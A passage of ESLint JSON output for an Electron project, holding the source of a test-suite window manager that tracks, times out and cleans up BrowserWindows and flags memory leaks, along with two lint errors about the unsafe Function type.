properties before creating window\n    delete (windowOptions as any).id\n    delete (windowOptions as any).timeout\n    delete (windowOptions as any).metadata\n    \n    // Create the window\n    const window = new BrowserWindow(windowOptions)\n    \n    // Set up tracking\n    const tracked: TrackedWindow = {\n      id,\n      window,\n      createdAt: new Date(),\n      listeners: new Map(),\n      metadata: options.metadata\n    }\n    \n    // Set up timeout if specified\n    const timeout = options.timeout ?? this.options.defaultTimeout\n    if (timeout > 0) {\n      tracked.timeout = setTimeout(() => {\n        this.log(`Window ${id} auto-destroyed after ${timeout}ms timeout`)\n        this.destroyWindow(id)\n      }, timeout)\n    }\n    \n    // Track the window\n    this.windows.set(id, tracked)\n    \n    // Set up event handlers\n    this.setupWindowHandlers(tracked)\n    \n    // Record memory sample\n    this.memoryMonitor.recordSample()\n    \n    // Emit event\n    this.emit('window-created', { id, window })\n    \n    this.log(`Created window ${id}`)\n    \n    return window\n  }\n  \n  /**\n   * Gets a window by ID\n   */\n  public getWindow(id: string): BrowserWindow | undefined {\n    return this.windows.get(id)?.window\n  }\n  \n  /**\n   * Gets all active windows\n   */\n  public getAllWindows(): BrowserWindow[] {\n    return Array.from(this.windows.values())\n      .map(tracked => tracked.window)\n      .filter(window => !window.isDestroyed())\n  }\n  \n  /**\n   * Gets window count\n   */\n  public getWindowCount(): number {\n    return this.windows.size\n  }\n  \n  /**\n   * Destroys a specific window\n   */\n  public destroyWindow(id: string): void {\n    const tracked = this.windows.get(id)\n    if (!tracked) {\n      this.log(`Window ${id} not found for destruction`)\n      return\n    }\n    \n    // Clear timeout if exists\n    if (tracked.timeout) {\n      clearTimeout(tracked.timeout)\n    }\n    \n    // Remove all listeners\n    this.removeWindowListeners(tracked)\n    \n    // Destroy window if not already destroyed\n    if (!tracked.window.isDestroyed()) {\n      tracked.window.destroy()\n    }\n    \n    // Remove from tracking\n    this.windows.delete(id)\n    \n    // Record memory sample\n    this.memoryMonitor.recordSample()\n    \n    // Emit event\n    this.emit('window-destroyed', { id })\n    \n    this.log(`Destroyed window ${id}`)\n  }\n  \n  /**\n   * Destroys all windows\n   */\n  public async destroyAllWindows(): Promise<void> {\n    if (this.isCleaningUp) {\n      this.log('Already cleaning up, skipping duplicate call')\n      return\n    }\n    \n    this.isCleaningUp = true\n    \n    try {\n      const windowIds = Array.from(this.windows.keys())\n      \n      this.log(`Destroying ${windowIds.length} windows`)\n      \n      // Destroy all windows\n      for (const id of windowIds) {\n        this.destroyWindow(id)\n      }\n      \n      // Run additional cleanup handlers\n      for (const handler of this.cleanupHandlers) {\n        try {\n          await handler()\n        } catch (error) {\n          console.error('Cleanup handler failed:', error)\n        }\n      }\n      \n      this.cleanupHandlers.clear()\n      \n      // Check for memory leaks\n      if (this.memoryMonitor.detectLeak()) {\n        console.warn('Potential memory leak detected during window cleanup')\n      }\n      \n      this.emit('all-windows-destroyed')\n      \n    } finally {\n      this.isCleaningUp = false\n    }\n  }\n  \n  /**\n   * Registers a cleanup handler\n   */\n  public registerCleanupHandler(handler: () => void | Promise<void>): void {\n    this.cleanupHandlers.add(handler)\n  }\n  \n  /**\n   * Unregisters a cleanup handler\n   */\n  public unregisterCleanupHandler(handler: () => void | Promise<void>): void {\n    this.cleanupHandlers.delete(handler)\n  }\n  \n  /**\n   * Gets memory statistics\n   */\n  public getMemoryStats(): {\n    averageUsage: number\n    hasLeak: boolean\n    windowCount: number\n  } {\n    return {\n      averageUsage: this.memoryMonitor.getAverageUsage(),\n      hasLeak: this.memoryMonitor.detectLeak(),\n      windowCount: this.windows.size\n    }\n  }\n  \n  /**\n   * Resets memory monitoring\n   */\n  public resetMemoryMonitor(): void {\n    this.memoryMonitor.reset()\n  }\n  \n  /**\n   * Adds a tracked event listener to a window\n   */\n  public addWindowListener(\n    id: string, \n    event: string, \n    listener: Function\n  ): void {\n    const tracked = this.windows.get(id)\n    if (!tracked) {\n      throw new Error(`Window ${id} not found`)\n    }\n    \n    // Remove previous listener if exists\n    if (tracked.listeners.has(event)) {\n      const oldListener = tracked.listeners.get(event)!\n      tracked.window.removeListener(event as any, oldListener as any)\n    }\n    \n    // Add new listener\n    tracked.window.on(event as any, listener as any)\n    tracked.listeners.set(event, listener)\n  }\n  \n  /**\n   * Removes a tracked event listener from a window\n   */\n  public removeWindowListener(id: string, event: string): void {\n    const tracked = this.windows.get(id)\n    if (!tracked) return\n    \n    const listener = tracked.listeners.get(event)\n    if (listener) {\n      tracked.window.removeListener(event as any, listener as any)\n      tracked.listeners.delete(event)\n    }\n  }\n  \n  /**\n   * Sets up event handlers for a window\n   */\n  private setupWindowHandlers(tracked: TrackedWindow): void {\n    const { window, id } = tracked\n    \n    // Handle close event\n    const closeHandler = () => {\n      this.log(`Window ${id} closed`)\n      this.destroyWindow(id)\n    }\n    window.on('closed', closeHandler)\n    tracked.listeners.set('closed', closeHandler)\n    \n    // Handle unresponsive\n    const unresponsiveHandler = () => {\n      console.warn(`Window ${id} became unresponsive`)\n      this.emit('window-unresponsive', { id, window })\n    }\n    window.on('unresponsive', unresponsiveHandler)\n    tracked.listeners.set('unresponsive', unresponsiveHandler)\n    \n    // Handle responsive\n    const responsiveHandler = () => {\n      this.log(`Window ${id} became responsive`)\n      this.emit('window-responsive', { id, window })\n    }\n    window.on('responsive', responsiveHandler)\n    tracked.listeners.set('responsive', responsiveHandler)\n  }\n  \n  /**\n   * Removes all event listeners from a window\n   */\n  private removeWindowListeners(tracked: TrackedWindow): void {\n    for (const [event, listener] of tracked.listeners) {\n      if (!tracked.window.isDestroyed()) {\n        tracked.window.removeListener(event as any, listener as any)\n      }\n    }\n    tracked.listeners.clear()\n  }\n  \n  /**\n   * Sets up global cleanup handlers\n   */\n  private setupGlobalHandlers(): void {\n    // Handle app quit\n    const quitHandler = async () => {\n      this.log('App quitting, cleaning up windows')\n      await this.destroyAllWindows()\n    }\n    app.on('before-quit', quitHandler)\n    \n    // Handle process exit\n    const exitHandler = () => {\n      this.log('Process exiting, forcing window cleanup')\n      // Force synchronous cleanup\n      for (const [id] of this.windows) {\n        this.destroyWindow(id)\n      }\n    }\n    process.on('exit', exitHandler)\n    \n    // Handle uncaught errors\n    const errorHandler = (error: Error) => {\n      console.error('Uncaught error, cleaning up windows:', error)\n      this.destroyAllWindows().catch(console.error)\n    }\n    process.on('uncaughtException', errorHandler)\n    process.on('unhandledRejection', errorHandler)\n  }\n  \n  /**\n   * Logs a message if logging is enabled\n   */\n  private log(message: string): void {\n    if (this.options.enableLogging) {\n      console.log(`[TestWindowManager] ${message}`)\n    }\n  }\n}\n\n/**\n * Global window manager instance for test suites\n */\nexport const globalWindowManager = new TestWindowManager({\n  defaultTimeout: 60000, // 1 minute for tests\n  maxWindows: 20,\n  showWindows: false,\n  enableLogging: process.env.DEBUG === 'true'\n})\n\n/**\n * Helper function to ensure all windows are closed\n */\nexport async function ensureAllWindowsClosed(): Promise<void> {\n  const allWindows = BrowserWindow.getAllWindows()\n  for (const window of allWindows) {\n    if (!window.isDestroyed()) {\n      window.destroy()\n    }\n  }\n}\n\n/**\n * Helper to create a window with automatic cleanup in tests\n */\nexport function createTestWindow(\n  options: WindowCreationOptions = {}\n): BrowserWindow {\n  return globalWindowManager.createWindow(options)\n}\n\n/**\n * Helper to destroy all test windows\n */\nexport async function cleanupTestWindows(): Promise<void> {\n  await globalWindowManager.destroyAllWindows()\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/utils/window-manager.ts","messages":[{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":18,"column":26,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":18,"endColumn":34},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":321,"column":15,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":321,"endColumn":23}],"suppressedMessages":[],"errorCount":2,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Test Window Manager for Electron Testing (2025)\n * \n * Centralized window management utility implementing best practices for\n * Electron window lifecycle management during testing. Provides comprehensive\n * tracking, cleanup, and safety features following 2025 security standards.\n */\n\nimport { BrowserWindow, app, BrowserWindowConstructorOptions } from 'electron'\nimport { EventEmitter } from 'events'\n\n// Window tracking types\ninterface TrackedWindow {\n  id: string\n  window: BrowserWindow\n  createdAt: Date\n  timeout?: NodeJS.Timeout\n  listeners: Map<string, Function>\n  metadata?: Record<string, any>\n}\n\ninterface WindowManagerOptions {\n  defaultTimeout?: number // Auto-destroy timeout in ms\n  maxWindows?: number // Maximum concurrent windows\n  showWindows?: boolean // Whether to show windows during tests\n  enableLogging?: boolean // Enable detailed logging\n}\n\ninterface WindowCreationOptions extends BrowserWindowConstructorOptions {\n  id?: string // Custom ID for the window\n  timeout?: number // Override default timeout\n  metadata?: Record<string, any> // Custom metadata\n}\n\n// Memory tracking utilities\nexport class MemoryMonitor {\n  private samples: number[] = []\n  private maxSamples: number = 20\n  \n  public recordSample(): void {\n    const usage = process.memoryUsage().heapUsed\n    this.samples.push(usage)\n    \n    if (this.samples.length > this.maxSamples) {\n      this.samples.shift()\n    }\n  }\n  \n  public getAverageUsage(): number {\n    if (this.samples.length === 0) return 0\n    return this.samples.reduce((a, b) => a + b, 0) / this.samples.length\n  }\n  \n  public detectLeak(threshold: number = 0.1): boolean {\n    if (this.samples.length < 10) return false\n    \n    const firstHalf = this.samples.slice(0, 5).reduce((a, b) => a + b, 0) / 5\n    const lastHalf = this.samples.slice(-5).reduce((a, b) => a + b, 0) / 5\n    \n    const growthRate = (lastHalf - firstHalf) / firstHalf\n    return growthRate > threshold\n  }\n  \n  public reset(): void {\n    this.samples = []\n  }\n}\n\n/**\n * Comprehensive Test Window Manager\n * \n * Features:\n * - Automatic window tracking and cleanup\n * - Timeout protection\n * - Memory leak detection\n * - Event listener management\n * - Concurrent window limits\n * - Detailed logging\n * - Error recovery\n */\nexport class TestWindowManager extends EventEmitter {\n  private windows: Map<string, TrackedWindow> = new Map()\n  private cleanupHandlers: Set<() => void | Promise<void>> = new Set()\n  private memoryMonitor: MemoryMonitor = new MemoryMonitor()\n  private options: Required<WindowManagerOptions>\n  private isCleaningUp: boolean = false\n  private windowCounter: number = 0\n  \n  constructor(options: WindowManagerOptions = {}) {\n    super()\n    \n    this.options = {\n      defaultTimeout: options.defaultTimeout ?? 300000, // 5 minutes default\n      maxWindows: options.maxWindows ?? 10,\n      showWindows: options.showWindows ?? false,\n      enableLogging: options.enableLogging ?? false\n    }\n    \n    // Set up global cleanup handlers\n    this.setupGlobalHandlers()\n  }\n  \n  /**\n   * Creates a managed window with automatic tracking and cleanup\n   */\n  public createWindow(options: WindowCreationOptions = {}): BrowserWindow {\n    // Check window limit\n    if (this.windows.size >= this.options.maxWindows) {\n      throw new Error(`Maximum window limit (${this.options.maxWindows}) reached`)\n    }\n    \n    // Generate unique ID if not provided\n    const id = options.id || `window-${Date.now()}-${this.windowCounter++}`\n    \n    // Check for duplicate ID\n    if (this.windows.has(id)) {\n      throw new Error(`Window with id \"${id}\" already exists`)\n    }\n    \n    // Prepare window options\n    const windowOptions: BrowserWindowConstructorOptions = {\n      show: this.options.showWindows,\n      width: 800,\n      height: 600,\n      webPreferences: {\n        nodeIntegration: false,\n        contextIsolation: true,\n        webSecurity: true,\n        ...options.webPreferences\n      },\n      ...options\n    }\n    \n    // Remove custom properties before creating window\n    delete (windowOptions as any).id\n    delete (windowOptions as any).timeout\n    delete (windowOptions as any).metadata\n    \n    // Create the window\n    const window = new BrowserWindow(windowOptions)\n    \n    // Set up tracking\n    const tracked: TrackedWindow = {\n      id,\n      window,\n      createdAt: new Date(),\n      listeners: new Map(),\n      metadata: options.metadata\n    }\n    \n    // Set up timeout if specified\n    const timeout = options.timeout ?? this.options.defaultTimeout\n    if (timeout > 0) {\n      tracked.timeout = setTimeout(() => {\n        this.log(`Window ${id} auto-destroyed after ${timeout}ms timeout`)\n        this.destroyWindow(id)\n      }, timeout)\n    }\n    \n    // Track the window\n    this.windows.set(id, tracked)\n    \n    // Set up event handlers\n    this.setupWindowHandlers(tracked)\n    \n    // Record memory sample\n    this.memoryMonitor.recordSample()\n    \n    // Emit event\n    this.emit('window-created', { id, window })\n    \n    this.log(`Created window ${id}`)\n    \n    return window\n  }\n  \n  /**\n   * Gets a window by ID\n   */\n  public getWindow(id: string): BrowserWindow | undefined {\n    return this.windows.get(id)?.window\n  }\n  \n  /**\n   * Gets all active windows\n   */\n  public getAllWindows(): BrowserWindow[] {\n    return Array.from(this.windows.values())\n      .map(tracked => tracked.window)\n      .filter(window => !window.isDestroyed())\n  }\n  \n  /**\n   * Gets window count\n   */\n  public getWindowCount(): number {\n    return this.windows.size\n  }\n  \n  /**\n   * Destroys a specific window\n   */\n  public destroyWindow(id: string): void {\n    const tracked = this.windows.get(id)\n    if (!tracked) {\n      this.log(`Window ${id} not found for destruction`)\n      return\n    }\n    \n    // Clear timeout if exists\n    if (tracked.timeout) {\n      clearTimeout(tracked.timeout)\n    }\n    \n    // Remove all listeners\n    this.removeWindowListeners(tracked)\n    \n    // Destroy window if not already destroyed\n    if (!tracked.window.isDestroyed()) {\n      tracked.window.destroy()\n    }\n    \n    // Remove from tracking\n    this.windows.delete(id)\n    \n    // Record memory sample\n    this.memoryMonitor.recordSample()\n    \n    // Emit event\n    this.emit('window-destroyed', { id })\n    \n    this.log(`Destroyed window ${id}`)\n  }\n  \n  /**\n   * Destroys all windows\n   */\n  public async destroyAllWindows(): Promise<void> {\n    if (this.isCleaningUp) {\n      this.log('Already cleaning up, skipping duplicate call')\n      return\n    }\n    \n    this.isCleaningUp = true\n    \n    try {\n      const windowIds = Array.from(this.windows.keys())\n      \n      this.log(`Destroying ${windowIds.length} windows`)\n      \n      // Destroy all windows\n      for (const id of windowIds) {\n        this.destroyWindow(id)\n      }\n      \n      // Run additional cleanup handlers\n      for (const handler of this.cleanupHandlers) {\n        try {\n          await handler()\n        } catch (error) {\n          console.error('Cleanup handler failed:', error)\n        }\n      }\n      \n      this.cleanupHandlers.clear()\n      \n      // Check for memory leaks\n      if (this.memoryMonitor.detectLeak()) {\n        console.warn('Potential memory leak detected during window cleanup')\n      }\n      \n      this.emit('all-windows-destroyed')\n      \n    } finally {\n      this.isCleaningUp = false\n    }\n  }\n  \n  /**\n   * Registers a cleanup handler\n   */\n  public registerCleanupHandler(handler: () => void | Promise<void>): void {\n    this.cleanupHandlers.add(handler)\n  }\n  \n  /**\n   * Unregisters a cleanup handler\n   */\n  public unregisterCleanupHandler(handler: () => void | Promise<void>): void {\n    this.cleanupHandlers.delete(handler)\n  }\n  \n  /**\n   * Gets memory statistics\n   */\n  public getMemoryStats(): {\n    averageUsage: number\n    hasLeak: boolean\n    windowCount: number\n  } {\n    return {\n      averageUsage: this.memoryMonitor.getAverageUsage(),\n      hasLeak: this.memoryMonitor.detectLeak(),\n      windowCount: this.windows.size\n    }\n  }\n  \n  /**\n   * Resets memory monitoring\n   */\n  public resetMemoryMonitor(): void {\n    this.memoryMonitor.reset()\n  }\n  \n  /**\n   * Adds a tracked event listener to a window\n   */\n  public addWindowListener(\n    id: string, \n    event: string, \n    listener: Function\n  ): void {\n    const tracked = this.windows.get(id)\n    if (!tracked) {\n      throw new Error(`Window ${id} not found`)\n    }\n    \n    // Remove previous listener if exists\n    if (tracked.listeners.has(event)) {\n      const oldListener = tracked.listeners.get(event)!\n      tracked.window.removeListener(event as any, oldListener as any)\n    }\n    \n    // Add new listener\n    tracked.window.on(event as any, listener as any)\n    tracked.listeners.set(event, listener)\n  }\n  \n  /**\n   * Removes a tracked event listener from a window\n   */\n  public removeWindowListener(id: string, event: string): void {\n    const tracked = this.windows.get(id)\n    if (!tracked) return\n    \n    const listener = tracked.listeners.get(event)\n    if (listener) {\n      tracked.window.removeListener(event as any, listener as any)\n      tracked.listeners.delete(event)\n    }\n  }\n  \n  /**\n   * Sets up event handlers for a window\n   */\n  private setupWindowHandlers(tracked: TrackedWindow): void {\n    const { window, id } = tracked\n    \n    // Handle close event\n    const closeHandler = () => {\n      this.log(`Window ${id} closed`)\n      this.destroyWindow(id)\n    }\n    window.on('closed', closeHandler)\n    tracked.listeners.set('closed', closeHandler)\n    \n    // Handle unresponsive\n    const unresponsiveHandler = () => {\n      console.warn(`Window ${id} became unresponsive`)\n      this.emit('window-unresponsive', { id, window })\n    }\n    window.on('unresponsive', unresponsiveHandler)\n    tracked.listeners.set('unresponsive', unresponsiveHandler)\n    \n    // Handle responsive\n    const responsiveHandler = () => {\n      this.log(`Window ${id} became responsive`)\n      this.emit('window-responsive', { id, window })\n    }\n    window.on('responsive', responsiveHandler)\n    tracked.listeners.set('responsive', responsiveHandler)\n  }\n  \n  /**\n   * Removes all event listeners from a window\n   */\n  private removeWindowListeners(tracked: TrackedWindow): void {\n    for (const [event, listener] of tracked.listeners) {\n      if (!tracked.window.isDestroyed()) {\n        tracked.window.removeListener(event as any, listener as any)\n      }\n    }\n    tracked.listeners.clear()\n  }\n  \n  /**\n   * Sets up global cleanup handlers\n   */\n  private setupGlobalHandlers(): void {\n    // Handle app quit\n    const quitHandler = async () => {\n      this.log('App quitting, cleaning up windows')\n      await this.destroyAllWindows()\n    }\n    app.on('before-quit', quitHandler)\n    \n    // Handle process exit\n    const exitHandler = () => {\n      this.log('Process exiting, forcing window cleanup')\n      // Force synchronous cleanup\n      for (const [id] of this.windows) {\n        this.destroyWindow(id)\n      }\n    }\n    process.on('exit', exitHandler)\n    \n    // Handle uncaught errors\n    const errorHandler = (error: Error) => {\n      console.error('Uncaught error, cleaning up windows:', error)\n      this.destroyAllWindows().catch(console.error)\n    }\n    process.on('uncaughtException', errorHandler)\n    process.on('unhandledRejection', errorHandler)\n  }\n  \n  /**\n   * Logs a message if logging is enabled\n   */\n  private log(message: string): void {\n    if (this.options.enableLogging) {\n      console.log(`[TestWindowManager] ${message}`)\n    }\n  }\n}\n\n/**\n * Global window manager instance for test suites\n */\nexport const globalWindowManager = new TestWindowManager({\n  defaultTimeout: 60000, // 1 minute for tests\n  maxWindows: 20,\n  showWindows: false,\n  enableLogging: process.env.DEBUG === 'true'\n})\n\n/**\n * Helper function to ensure all windows are closed\n */\nexport async function ensureAllWindowsClosed(): Promise<void> {\n  const allWindows = BrowserWindow.getAllWindows()\n  for (const window of allWindows) {\n    if (!window.isDestroyed()) {\n      window.destroy()\n    }\n  }\n}\n\n/**\n * Helper to create a window with automatic cleanup in tests\n */\nexport function createTestWindow(\n  options: WindowCreationOptions = {}\n): BrowserWindow {\n  return globalWindowManager.createWindow(options)\n}\n\n/**\n * Helper to destroy all test windows\n */\nexport async function cleanupTestWindows(): Promise<void> {\n  await globalWindowManager.destroyAllWindows()\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/vite.config.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/vite.main.config.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/vite.preload.config.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/vitest-setup.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/vitest.config.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]}]
